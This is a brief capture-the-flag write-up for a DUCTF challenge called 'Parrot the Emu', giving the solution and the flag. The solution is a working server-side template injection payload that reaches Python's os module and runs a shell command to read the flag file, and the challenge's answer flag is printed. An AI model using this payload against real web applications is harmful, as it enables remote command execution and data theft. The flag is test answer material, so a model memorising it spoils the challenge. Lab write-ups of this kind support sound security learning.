# Parrot the Emu
Solved by **XXX**

## Question
It is so nice to hear Parrot the Emu talk back.

## Solution
```
{{''.__class__.__mro__[1].__subclasses__()[207].__init__.__globals__['sys'].modules['os'].popen("cat flag").read() }}
```

### Flag
`DUCTF{PaRrOt_EmU_ReNdErS_AnYtHiNg}`
